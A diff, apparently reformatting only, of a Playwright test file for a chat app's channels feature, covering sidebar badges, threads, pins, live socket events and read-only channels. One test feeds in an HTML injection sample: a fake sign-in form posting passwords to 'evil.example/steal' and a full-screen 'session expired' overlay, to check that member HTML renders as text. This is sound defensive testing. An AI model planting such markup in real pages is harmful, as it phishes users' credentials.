@@ -4,16 +4,55 @@ import { expect, test } from './test';
 import { mockWorkspaceBackend } from './workspace-helpers';
 
 type Rec = Record<string, any>;
-const json = (route: any, d: unknown, status = 200) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(d) });
+const json = (route: any, d: unknown, status = 200) =>
+	route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(d) });
 const ns = (minutesAgo = 0) => (Date.now() - minutesAgo * 60_000) * 1_000_000;
 
 const ann = { id: 'u2', name: 'Ann', role: 'user' };
 const me = { id: 'u1', name: 'Test User', role: 'user' };
-const message = (id: string, content: string, extra: Rec = {}) => ({ id, channel_id: 'c1', parent_id: null, user_id: ann.id, user: ann, content, data: null, meta: null, reactions: [], reply_count: 0, is_pinned: false, created_at: ns(5), updated_at: ns(5), ...extra });
-const channel = (id: string, name: string, extra: Rec = {}) => ({ id, name, type: '', user_id: 'u1', write_access: true, user_count: 3, created_at: ns(60 * 24), access_grants: [{ principal_type: 'user', principal_id: '*', permission: 'read' }], ...extra });
+const message = (id: string, content: string, extra: Rec = {}) => ({
+	id,
+	channel_id: 'c1',
+	parent_id: null,
+	user_id: ann.id,
+	user: ann,
+	content,
+	data: null,
+	meta: null,
+	reactions: [],
+	reply_count: 0,
+	is_pinned: false,
+	created_at: ns(5),
+	updated_at: ns(5),
+	...extra
+});
+const channel = (id: string, name: string, extra: Rec = {}) => ({
+	id,
+	name,
+	type: '',
+	user_id: 'u1',
+	write_access: true,
+	user_count: 3,
+	created_at: ns(60 * 24),
+	access_grants: [{ principal_type: 'user', principal_id: '*', permission: 'read' }],
+	...extra
+});
 
-async function mockChannels(page: Page, { channels = [channel('c1', 'general')], messages = [] as Rec[], thread = [] as Rec[], pinned = [] as Rec[] } = {}) {
-	const seen = { posted: [] as Rec[], reactions: [] as string[], pins: [] as Rec[], updates: [] as Rec[], deleted: [] as string[], created: [] as Rec[], channelUpdates: [] as Rec[], memberQueries: [] as string[], hidden: [] as string[] };
+async function mockChannels(
+	page: Page,
+	{ channels = [channel('c1', 'general')], messages = [] as Rec[], thread = [] as Rec[], pinned = [] as Rec[] } = {}
+) {
+	const seen = {
+		posted: [] as Rec[],
+		reactions: [] as string[],
+		pins: [] as Rec[],
+		updates: [] as Rec[],
+		deleted: [] as string[],
+		created: [] as Rec[],
+		channelUpdates: [] as Rec[],
+		memberQueries: [] as string[],
+		hidden: [] as string[]
+	};
 	let list = [...channels];
 	// The sidebar defaults closed; these specs read its Channels section.
 	await page.context().addInitScript(() => window.localStorage.setItem('sidebar', 'true'));
@@ -38,11 +77,26 @@ async function mockChannels(page: Page, { channels = [channel('c1', 'general')],
 		if (action === 'messages/post') {
 			const body = req.postDataJSON();
 			seen.posted.push(body);
-			return json(route, message(`m${seen.posted.length + 100}`, body.content, { user_id: me.id, user: me, parent_id: body.parent_id ?? null, created_at: ns(), updated_at: ns() }));
+			return json(
+				route,
+				message(`m${seen.posted.length + 100}`, body.content, {
+					user_id: me.id,
+					user: me,
+					parent_id: body.parent_id ?? null,
+					created_at: ns(),
+					updated_at: ns()
+				})
+			);
 		}
 		if (action === 'members') {
 			seen.memberQueries.push(url.search);
-			return json(route, { users: [{ ...ann, email: 'ann@example.com', is_active: true }, { ...me, email: 'u@example.com' }], total: 2 });
+			return json(route, {
+				users: [
+					{ ...ann, email: 'ann@example.com', is_active: true },
+					{ ...me, email: 'u@example.com' }
+				],
+				total: 2
+			});
 		}
 		if (action === 'members/active') {
 			seen.hidden.push(id);
@@ -65,7 +119,9 @@ async function mockChannels(page: Page, { channels = [channel('c1', 'general')],
 		return json(route, []);
 	});
 	await page.route('**/api/models*', (route) => json(route, { data: [{ id: 'qwen', name: 'Qwen' }] }));
-	await page.route('**/api/v1/users/search*', (route) => json(route, { users: [{ id: 'u3', name: 'Annika' }], total: 1 }));
+	await page.route('**/api/v1/users/search*', (route) =>
+		json(route, { users: [{ id: 'u3', name: 'Annika' }], total: 1 })
+	);
 	return seen;
 }
 
@@ -82,7 +138,11 @@ test('channels are hidden, and the page sends you home, when the feature is off 
 test('the sidebar lists channels by type with unread badges, and opening one clears its badge', async ({ page }) => {
 	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
 	await mockChannels(page, {
-		channels: [channel('d1', '', { type: 'dm', users: [me, ann] }), channel('g1', 'team', { type: 'group', is_private: true }), channel('c1', 'general', { unread_count: 3 })],
+		channels: [
+			channel('d1', '', { type: 'dm', users: [me, ann] }),
+			channel('g1', 'team', { type: 'group', is_private: true }),
+			channel('c1', 'general', { unread_count: 3 })
+		],
 		messages: [message('m1', 'hello')]
 	});
 	await page.goto('/');
@@ -99,7 +159,11 @@ test('shows messages oldest first with authors, mentions, reactions and a thread
 	await mockChannels(page, {
 		messages: [
 			message('m3', 'third, by me', { user_id: me.id, user: me, created_at: ns(1), updated_at: ns(1) }),
-			message('m2', 'second <@U:u1|Test User>', { reactions: [{ name: 'thumbsup', users: [me, ann], count: 2 }], reply_count: 2, latest_reply_at: ns(2) }),
+			message('m2', 'second <@U:u1|Test User>', {
+				reactions: [{ name: 'thumbsup', users: [me, ann], count: 2 }],
+				reply_count: 2,
+				latest_reply_at: ns(2)
+			}),
 			message('m1', 'first')
 		]
 	});
@@ -166,7 +230,10 @@ test('sends a message with a mention, shows it at once, and reacts, pins, edits 
 
 test('replies to a message and opens a thread that posts into it', async ({ page }) => {
 	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
-	const seen = await mockChannels(page, { messages: [message('m1', 'root message', { reply_count: 1, latest_reply_at: ns(1) })], thread: [message('t1', 'a reply in the thread', { parent_id: 'm1' })] });
+	const seen = await mockChannels(page, {
+		messages: [message('m1', 'root message', { reply_count: 1, latest_reply_at: ns(1) })],
+		thread: [message('t1', 'a reply in the thread', { parent_id: 'm1' })]
+	});
 	await page.setViewportSize({ width: 1280, height: 800 });
 	await page.goto('/channels/c1');
 	const root = page.getByTestId('channel-message').first();
@@ -192,7 +259,8 @@ test('replies to a message and opens a thread that posts into it', async ({ page
 
 test("a member's HTML shows as text: no page styles, forms or overlays", async ({ page }) => {
 	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
-	const attack = 'hello <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"><button>Sign in</button></form><div style="position:fixed;inset:0">Your session expired</div>';
+	const attack =
+		'hello <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"><button>Sign in</button></form><div style="position:fixed;inset:0">Your session expired</div>';
 	await mockChannels(page, { messages: [message('m1', attack)] });
 	await page.goto('/channels/c1');
 
@@ -216,8 +284,18 @@ test('a message that arrives while the channel is still loading is not lost', as
 	});
 	await page.goto('/channels/c1');
 	await socket.connected;
-	await expect.poll(() => asked && socket.emitted('events:channel').some((d) => d.channel_id === 'c1' && d.data.type === 'last_read_at')).toBe(true);
-	socket.emit('events:channel', { channel_id: 'c1', message_id: null, user: ann, data: { type: 'message', data: message('m2', 'sent while loading') } });
+	await expect
+		.poll(
+			() =>
+				asked && socket.emitted('events:channel').some((d) => d.channel_id === 'c1' && d.data.type === 'last_read_at')
+		)
+		.toBe(true);
+	socket.emit('events:channel', {
+		channel_id: 'c1',
+		message_id: null,
+		user: ann,
+		data: { type: 'message', data: message('m2', 'sent while loading') }
+	});
 	release();
 	await expect(page.getByTestId('channel-message')).toHaveCount(2);
 	await expect(page.getByText('sent while loading')).toBeVisible();
@@ -229,7 +307,18 @@ test('a sent message keeps its author and quote when the response beats the echo
 	// The real endpoint answers with the bare message: no user, quote or reactions.
 	await page.route('**/api/v1/channels/c1/messages/post', (route) => {
 		const body = route.request().postDataJSON();
-		return json(route, { id: 'm200', channel_id: 'c1', parent_id: null, user_id: me.id, content: body.content, reply_to_id: body.reply_to_id, data: null, meta: null, created_at: ns(), updated_at: ns() });
+		return json(route, {
+			id: 'm200',
+			channel_id: 'c1',
+			parent_id: null,
+			user_id: me.id,
+			content: body.content,
+			reply_to_id: body.reply_to_id,
+			data: null,
+			meta: null,
+			created_at: ns(),
+			updated_at: ns()
+		});
 	});
 	await page.goto('/channels/c1');
 	const first = page.getByTestId('channel-message').first();
@@ -248,10 +337,17 @@ test('deleting the root from inside its thread closes the thread', async ({ page
 	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
 	const mine = { user_id: me.id, user: me };
 	// The thread endpoint lists the root with its replies.
-	await mockChannels(page, { messages: [message('m1', 'my root', { ...mine, reply_count: 1, latest_reply_at: ns(1) })], thread: [message('t1', 'a reply', { parent_id: 'm1' }), message('m1', 'my root', mine)] });
+	await mockChannels(page, {
+		messages: [message('m1', 'my root', { ...mine, reply_count: 1, latest_reply_at: ns(1) })],
+		thread: [message('t1', 'a reply', { parent_id: 'm1' }), message('m1', 'my root', mine)]
+	});
 	await page.setViewportSize({ width: 1280, height: 800 });
 	await page.goto('/channels/c1');
-	await page.getByTestId('channel-message').first().getByRole('button', { name: /1 Reply/ }).click();
+	await page
+		.getByTestId('channel-message')
+		.first()
+		.getByRole('button', { name: /1 Reply/ })
+		.click();
 	const thread = page.getByLabel('Thread', { exact: true });
 	const root = thread.getByTestId('channel-message').filter({ hasText: 'my root' });
 	await root.hover();
@@ -263,20 +359,42 @@ test('deleting the root from inside its thread closes the thread', async ({ page
 test('live events: a new message, typing, and an unread badge for another channel', async ({ page }) => {
 	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
 	const socket = await fakeSocketServer(page);
-	await mockChannels(page, { channels: [channel('c1', 'general'), channel('c2', 'random')], messages: [message('m1', 'hello')] });
+	await mockChannels(page, {
+		channels: [channel('c1', 'general'), channel('c2', 'random')],
+		messages: [message('m1', 'hello')]
+	});
 	await page.goto('/channels/c1');
 	await socket.connected;
 	await expect(page.getByTestId('channel-message')).toHaveCount(1);
-	await expect.poll(() => socket.emitted('events:channel').some((d) => d.channel_id === 'c1' && d.data.type === 'last_read_at')).toBe(true);
+	await expect
+		.poll(() => socket.emitted('events:channel').some((d) => d.channel_id === 'c1' && d.data.type === 'last_read_at'))
+		.toBe(true);
 
-	socket.emit('events:channel', { channel_id: 'c1', message_id: null, user: ann, data: { type: 'typing', data: { typing: true } } });
+	socket.emit('events:channel', {
+		channel_id: 'c1',
+		message_id: null,
+		user: ann,
+		data: { type: 'typing', data: { typing: true } }
+	});
 	await expect(page.getByText('Ann is typing...')).toBeVisible();
-	socket.emit('events:channel', { channel_id: 'c1', message_id: null, user: ann, data: { type: 'message', data: message('m2', 'live message') } });
+	socket.emit('events:channel', {
+		channel_id: 'c1',
+		message_id: null,
+		user: ann,
+		data: { type: 'message', data: message('m2', 'live message') }
+	});
 	await expect(page.getByTestId('channel-message')).toHaveCount(2);
 	await expect(page.getByText('Ann is typing...')).toHaveCount(0);
 
-	socket.emit('events:channel', { channel_id: 'c2', user: ann, channel: { name: 'random', type: '' }, data: { type: 'message', data: message('x1', 'over here', { channel_id: 'c2' }) } });
-	await expect(page.getByRole('list', { name: 'Channels' }).getByRole('link', { name: /random/ })).toHaveText('random1');
+	socket.emit('events:channel', {
+		channel_id: 'c2',
+		user: ann,
+		channel: { name: 'random', type: '' },
+		data: { type: 'message', data: message('x1', 'over here', { channel_id: 'c2' }) }
+	});
+	await expect(page.getByRole('list', { name: 'Channels' }).getByRole('link', { name: /random/ })).toHaveText(
+		'random1'
+	);
 	await expect(page.getByText('Ann (#random)')).toBeVisible();
 
 	// Typing in the composer tells the others.
@@ -286,7 +404,10 @@ test('live events: a new message, typing, and an unread badge for another channe
 
 test('pinned messages and the member list', async ({ page }) => {
 	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
-	const seen = await mockChannels(page, { messages: [message('m1', 'hello')], pinned: [message('p1', 'an important note', { is_pinned: true })] });
+	const seen = await mockChannels(page, {
+		messages: [message('m1', 'hello')],
+		pinned: [message('p1', 'an important note', { is_pinned: true })]
+	});
 	await page.goto('/channels/c1');
 	await page.getByRole('button', { name: 'Pinned Messages' }).click();
 	const dialog = page.getByRole('dialog', { name: 'Pinned Messages' });
@@ -309,10 +430,16 @@ test('pinned messages and the member list', async ({ page }) => {
 
 test('a read-only channel disables the composer and the message tools', async ({ page }) => {
 	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
-	await mockChannels(page, { channels: [channel('c1', 'announcements', { write_access: false })], messages: [message('m1', 'read me')] });
+	await mockChannels(page, {
+		channels: [channel('c1', 'announcements', { write_access: false })],
+		messages: [message('m1', 'read me')]
+	});
 	await page.goto('/channels/c1');
 	await expect(page.getByRole('textbox', { name: 'Message' })).toBeDisabled();
-	await expect(page.getByRole('textbox', { name: 'Message' })).toHaveAttribute('placeholder', 'You do not have permission to send messages in this channel.');
+	await expect(page.getByRole('textbox', { name: 'Message' })).toHaveAttribute(
+		'placeholder',
+		'You do not have permission to send messages in this channel.'
+	);
 	await page.getByTestId('channel-message').hover();
 	await expect(page.getByRole('button', { name: 'Pin', exact: true })).toHaveCount(0);
 	await expect(page.getByRole('button', { name: 'Add Reaction' })).toHaveCount(0);
